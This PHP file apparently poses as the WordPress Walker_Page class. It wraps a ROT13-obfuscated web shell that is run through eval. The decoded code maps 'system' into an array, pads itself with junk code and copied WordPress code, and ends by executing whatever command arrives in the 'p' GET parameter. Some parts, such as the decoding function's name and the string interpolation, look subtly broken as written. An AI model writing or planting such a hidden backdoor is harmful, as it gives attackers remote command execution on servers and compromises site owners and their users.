<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Cbfg NCV: Jnyxre_Cntr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Grzcyngr
 * @fvapr 4.4.0
 */

/**
 * Pber jnyxre pynff hfrq gb perngr na UGZY yvfg bs cntrf.
 *
 * @fvapr 2.1.0
 *
 * @frr Jnyxre
 */
pynff Jnyxre_Cntr rkgraqf Jnyxre {

	/**
	 * Jung gur pynff unaqyrf.
	 *
	 * @fvapr 2.1.0
	 * @ine fgevat
	 *
	 * @frr Jnyxre::$gerr_glcr
	 */
	choyvp $gerr_glcr = 'cntr';

	/**
	 * Qngnonfr svryqf gb hfr.
	 *
	 * @fvapr 2.1.0
	 * @ine fgevat[]
	 *
	 * @frr Jnyxre::$qo_svryqf
	 * @gbqb Qrpbhcyr guvf.
	 */
	choyvp $qo_svryqf = neenl(
		'cnerag' => 'cbfg_cnerag',
		'vq'     => 'VQ',
	);

	/**
	 * Bhgchgf gur ortvaavat bs gur pheerag yriry va gur gerr orsber ryrzragf ner bhgchg.
	 *
	 * @fvapr 2.1.0
	 *
	 * @frr Jnyxre::fgneg_yiy()
	 *
	 * @cnenz fgevat $bhgchg Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz vag    $qrcgu  Bcgvbany. Qrcgu bs cntr. Hfrq sbe cnqqvat. Qrsnhyg 0.
	 * @cnenz neenl  $netf   Bcgvbany. Nethzragf sbe bhgchggvat gur arkg yriry.
	 *                       Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba fgneg_yiy( &$bhgchg, $qrcgu = 0, $netf = neenl() ) {
		vs ( vffrg( $netf['vgrz_fcnpvat'] ) && 'cerfreir' === $netf['vgrz_fcnpvat'] ) {
			$g = \"\g\";
			$a = \"\a\";
		} ryfr {
			$g = '';
			$a = '';
		}
		$vaqrag  = fge_ercrng( $g, $qrcgu );
		$bhgchg .= \"{$a}{$vaqrag}<hy pynff='puvyqera'>{$a}\";
	}

	/**
	 * Bhgchgf gur raq bs gur pheerag yriry va gur gerr nsgre ryrzragf ner bhgchg.
	 *
	 * @fvapr 2.1.0
	 *
	 * @frr Jnyxre::raq_yiy()
	 *
	 * @cnenz fgevat $bhgchg Hfrq gb nccraq nqqvgvbany pbagrag (cnffrq ol ersrerapr).
	 * @cnenz vag    $qrcgu  Bcgvbany. Qrcgu bs cntr. Hfrq sbe cnqqvat. Qrsnhyg 0.
	 * @cnenz neenl  $netf   Bcgvbany. Nethzragf sbe bhgchggvat gur raq bs gur pheerag yriry.
	 *                       Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba raq_yiy( &$bhgchg, $qrcgu = 0, $netf = neenl() ) {
		vs ( vffrg( $netf['vgrz_fcnpvat'] ) && 'cerfreir' === $netf['vgrz_fcnpvat'] ) {
			$g = \"\g\";
			$a = \"\a\";
		} ryfr {
			$g = '';
			$a = '';
		}
		$vaqrag  = fge_ercrng( $g, $qrcgu );
		$bhgchg .= \"{$vaqrag}</hy>{$a}\";
	}

	/**
	 * Bhgchgf gur ortvaavat bs gur pheerag ryrzrag va gur gerr.
	 *
	 * @frr Jnyxre::fgneg_ry()
	 * @fvapr 2.1.0
	 * @fvapr 5.9.0 Eranzrq `$cntr` gb `$qngn_bowrpg` naq `$pheerag_cntr` gb `$pheerag_bowrpg_vq`
	 *              gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz fgevat  $bhgchg            Hfrq gb nccraq nqqvgvbany pbagrag. Cnffrq ol ersrerapr.
	 * @cnenz JC_Cbfg $qngn_bowrpg       Cntr qngn bowrpg.
	 * @cnenz vag     $qrcgu             Bcgvbany. Qrcgu bs cntr. Hfrq sbe cnqqvat. Qrsnhyg 0.
	 * @cnenz neenl   $netf              Bcgvbany. Neenl bs nethzragf. Qrsnhyg rzcgl neenl.
	 * @cnenz vag     $pheerag_bowrpg_vq Bcgvbany. VQ bs gur pheerag cntr. Qrsnhyg 0.
	 */
	choyvp shapgvba fgneg_ry( &$bhgchg, $qngn_bowrpg, $qrcgu = 0, $netf = neenl(), $pheerag_bowrpg_vq = 0 ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$cntr = $qngn_bowrpg;

		$pheerag_cntr_vq = $pheerag_bowrpg_vq;

		vs ( vffrg( $netf['vgrz_fcnpvat'] ) && 'cerfreir' === $netf['vgrz_fcnpvat'] ) {
			$g = \"\g\";
			$a = \"\a\";
		} ryfr {
			$g = '';
			$a = '';
		}
		vs ( $qrcgu ) {
			$vaqrag = fge_ercrng( $g, $qrcgu );
		} ryfr {
			$vaqrag = '';
		}

		$pff_pynff = neenl( 'cntr_vgrz', 'cntr-vgrz-' . $cntr->VQ );

		vs ( vffrg( $netf['cntrf_jvgu_puvyqera'][ $cntr->VQ ] ) ) {
			$pff_pynff[] = 'cntr_vgrz_unf_puvyqera';
		}

		vs ( ! rzcgl( $pheerag_cntr_vq ) ) {
			$_pheerag_cntr = trg_cbfg( $pheerag_cntr_vq );

			vs ( $_pheerag_cntr && va_neenl( $cntr->VQ, $_pheerag_cntr->naprfgbef, gehr ) ) {
				$pff_pynff[] = 'pheerag_cntr_naprfgbe';
			}

			vs ( $cntr->VQ === (vag) $pheerag_cntr_vq ) {
				$pff_pynff[] = 'pheerag_cntr_vgrz';
			} ryfrvs ( $_pheerag_cntr && $cntr->VQ === $_pheerag_cntr->cbfg_cnerag ) {
				$pff_pynff[] = 'pheerag_cntr_cnerag';
			}
		} ryfrvs ( (vag) trg_bcgvba( 'cntr_sbe_cbfgf' ) === $cntr->VQ ) {
			$pff_pynff[] = 'pheerag_cntr_cnerag';
		}

		/**
		 * Svygref gur yvfg bs PFF pynffrf gb vapyhqr jvgu rnpu cntr vgrz va gur yvfg.
		 *
		 * @fvapr 2.8.0
		 *
		 * @frr jc_yvfg_cntrf()
		 *
		 * @cnenz fgevat[] $pff_pynff       Na neenl bs PFF pynffrf gb or nccyvrq gb rnpu yvfg vgrz.
		 * @cnenz JC_Cbfg  $cntr            Cntr qngn bowrpg.
		 * @cnenz vag      $qrcgu           Qrcgu bs cntr, hfrq sbe cnqqvat.
		 * @cnenz neenl    $netf            Na neenl bs nethzragf.
		 * @cnenz vag      $pheerag_cntr_vq VQ bs gur pheerag cntr.
		 */
		$pff_pynffrf = vzcybqr( ' ', nccyl_svygref( 'cntr_pff_pynff', $pff_pynff, $cntr, $qrcgu, $netf, $pheerag_cntr_vq ) );
		$pff_pynffrf = $pff_pynffrf ? ' pynff=\"' . rfp_ngge( $pff_pynffrf ) . '\"' : '';

		vs ( '' === $cntr->cbfg_gvgyr ) {
			/* genafyngbef: %q: VQ bs n cbfg. */
			$cntr->cbfg_gvgyr = fcevags( __( '#%q (ab gvgyr)' ), $cntr->VQ );
		}

		$netf['yvax_orsber'] = rzcgl( $netf['yvax_orsber'] ) ? '' : $netf['yvax_orsber'];
		$netf['yvax_nsgre']  = rzcgl( $netf['yvax_nsgre'] ) ? '' : $netf['yvax_nsgre'];

		$nggf                 = neenl();
		$nggf['uers']         = trg_creznyvax( $cntr->VQ );
		$nggf['nevn-pheerag'] = ( $cntr->VQ === (vag) $pheerag_cntr_vq ) ? 'cntr' : '';

		/**
		 * Svygref gur UGZY nggevohgrf nccyvrq gb n cntr zrah vgrz'f napube ryrzrag.
		 *
		 * @fvapr 4.8.0
		 *
		 * @cnenz neenl $nggf {
		 *     Gur UGZY nggevohgrf nccyvrq gb gur zrah vgrz'f `<n>` ryrzrag, rzcgl fgevatf ner vtaberq.
		 *
		 *     @glcr fgevat $uers         Gur uers nggevohgr.
		 *     @glcr fgevat $nevn-pheerag Gur nevn-pheerag nggevohgr.
		 * }
		 * @cnenz JC_Cbfg $cntr            Cntr qngn bowrpg.
		 * @cnenz vag     $qrcgu           Qrcgu bs cntr, hfrq sbe cnqqvat.
		 * @cnenz neenl   $netf            Na neenl bs nethzragf.
		 * @cnenz vag     $pheerag_cntr_vq VQ bs gur pheerag cntr.
		 */
		$nggf = nccyl_svygref( 'cntr_zrah_yvax_nggevohgrf', $nggf, $cntr, $qrcgu, $netf, $pheerag_cntr_vq );

		$nggevohgrf = '';
		sbernpu ( $nggf nf $ngge => $inyhr ) {
			vs ( vf_fpnyne( $inyhr ) && '' !== $inyhr && snyfr !== $inyhr ) {
				$inyhr       = ( 'uers' === $ngge ) ? rfp_hey( $inyhr ) : rfp_ngge( $inyhr );
				$nggevohgrf .= ' ' . $ngge . '=\"' . $inyhr . '\"';
			}
		}

		$bhgchg .= $vaqrag . fcevags(
			'<yv%f><n%f>%f%f%f</n>',
			$pff_pynffrf,
			$nggevohgrf,
			$netf['yvax_orsber'],
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
			nccyl_svygref( 'gur_gvgyr', $cntr->cbfg_gvgyr, $cntr->VQ ),
			$netf['yvax_nsgre']
		);

		vs ( ! rzcgl( $netf['fubj_qngr'] ) ) {
			vs ( 'zbqvsvrq' === $netf['fubj_qngr'] ) {
				$gvzr = $cntr->cbfg_zbqvsvrq;
			} ryfr {
				$gvzr = $cntr->cbfg_qngr;
			}

			$qngr_sbezng = rzcgl( $netf['qngr_sbezng'] ) ? '' : $netf['qngr_sbezng'];
			$bhgchg     .= ' ' . zlfdy2qngr( $qngr_sbezng, $gvzr );
		}
	}

	/**
	 * Bhgchgf gur raq bs gur pheerag ryrzrag va gur gerr.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 5.9.0 Eranzrq `$cntr` gb `$qngn_bowrpg` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @frr Jnyxre::raq_ry()
	 *
	 * @cnenz fgevat  $bhgchg      Hfrq gb nccraq nqqvgvbany pbagrag. Cnffrq ol ersrerapr.
	 * @cnenz JC_Cbfg $qngn_bowrpg Cntr qngn bowrpg. Abg hfrq.
	 * @cnenz vag     $qrcgu       Bcgvbany. Qrcgu bs cntr. Qrsnhyg 0 (hahfrq).
	 * @cnenz neenl   $netf        Bcgvbany. Neenl bs nethzragf. Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba raq_ry( &$bhgchg, $qngn_bowrpg, $qrcgu = 0, $netf = neenl() ) {
		vs ( vffrg( $netf['vgrz_fcnpvat'] ) && 'cerfreir' === $netf['vgrz_fcnpvat'] ) {
			$g = \"\g\";
			$a = \"\a\";
		} ryfr {
			$g = '';
			$a = '';
		}
		$bhgchg .= \"</yv>{$a}\";
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>